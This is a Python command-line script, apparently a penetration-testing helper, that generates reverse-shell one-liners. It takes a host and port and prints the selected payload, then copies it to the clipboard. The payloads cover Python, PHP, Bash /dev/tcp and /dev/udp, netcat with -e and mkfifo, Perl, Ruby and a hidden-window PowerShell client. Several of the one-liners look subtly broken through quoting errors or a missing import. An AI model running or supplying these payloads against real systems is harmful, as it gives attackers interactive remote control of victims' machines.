import pyperclip
from rich.console import Console
from rich import print
from InquirerPy import inquirer

console = Console()

banner = """

 ██▀███  ▓█████ ██▒   █▓  ██████  ██░ ██ ▓█████  ██▓     ██▓    
▓██ ▒ ██▒▓█   ▀▓██░   █▒▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    
▓██ ░▄█ ▒▒███   ▓██  █▒░░ ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░    
▒██▀▀█▄  ▒▓█  ▄  ▒██ █░░  ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░    
░██▓ ▒██▒░▒████▒  ▒▀█░  ▒██████▒▒░▓█▒░██▓░▒████▒░██████▒░██████▒
░ ▒▓ ░▒▓░░░ ▒░ ░  ░ ▐░  ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
  ░▒ ░ ▒░ ░ ░  ░  ░ ░░  ░ ░▒  ░ ░ ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
  ░░   ░    ░       ░░  ░  ░  ░   ░  ░░ ░   ░     ░ ░     ░ ░   
   ░        ░  ░     ░        ░   ░  ░  ░   ░  ░    ░  ░    ░  ░
                    ░                                           
"""
console.print(banner, style="bold red")
def display_header():
    console.print("[bold yellow]Use arrow keys to select a reverse shell type and press Enter.[/bold yellow]")

def generate_shell_command(shell_type, target_ip, target_port):
    if shell_type == "Python (TCP)":
        return f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{target_ip}',{target_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])'"
    elif shell_type == "PHP (TCP)":
        return f"php -r '$sock=fsockopen(\"{target_ip}\", {target_port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    elif shell_type == "Bash (TCP)":
        return f"bash -i >& /dev/tcp/{target_ip}/{target_port} 0>&1"
    elif shell_type == "Netcat (TCP)":
        return f"nc {target_ip} {target_port} -e /bin/bash"
    elif shell_type == "nc mkfifo":
        return f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {target_ip} {target_port} > /tmp/f"
    elif shell_type == "Perl (TCP)":
        return f"perl -e 'use Socket;$i=\"{target_ip}\";$p={target_port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"
    elif shell_type == "Ruby (TCP)":
        return f"ruby -rsocket -e 'f=TCPSocket.open(\"{target_ip}\", {target_port});exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\", f.fileno, f.fileno, f.fileno)'"
    elif shell_type == "PowerShell (TCP)":
        return f"powershell -NoP -NonI -W Hidden -Exec Bypass $client = New-Object System.Net.Sockets.TCPClient('{target_ip}', {target_port});$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{$data = (New-Object Text.ASCIIEncoding).GetString($bytes, 0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII.GetBytes($sendback2));$stream.Write($sendbyte, 0, $sendbyte.Length);$stream.Flush()}}"
    elif shell_type == "Python (UDP)":
        return f"python -c 'import socket,os,sys;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect(('{target_ip}',{target_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])'"
    elif shell_type == "Bash (UDP)":
        return f"bash -i >& /dev/udp/{target_ip}/{target_port} 0>&1"
    elif shell_type == "Perl (UDP)":
        return f"perl -e 'use Socket;$i=\"{target_ip}\";$p={target_port};socket(S,PF_INET,SOCK_DGRAM,getprotobyname(\"udp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"

def main():
    display_header()

    target_ip = input("Enter the target IP address: ")

    target_port = input("Enter the target port: ")

    if not target_ip or not target_port.isdigit():
        print("[bold red]Invalid IP or Port! Exiting...[/bold red]")
        return

    shell_types = [
        "Python (TCP)",
        "PHP (TCP)",
        "Bash (TCP)",
        "Netcat (TCP)",
        "nc mkfifo",
        "Perl (TCP)",
        "Ruby (TCP)",
        "PowerShell (TCP)",
        "Python (UDP)",
        "Bash (UDP)",
        "Perl (UDP)"
    ]

    shell_choice = inquirer.select(
        message="Select reverse shell type:",
        choices=shell_types
    ).execute()

    shell_command = generate_shell_command(shell_choice, target_ip, target_port)

    console.print(f"\n[bold green]Generated Reverse Shell Command:[/bold green]")
    console.print(f"[bold cyan]{shell_command}[/bold cyan]")

    pyperclip.copy(shell_command)
    console.print("[bold green]The shell command has been copied to your clipboard![/bold green]")

if __name__ == "__main__":
    main()
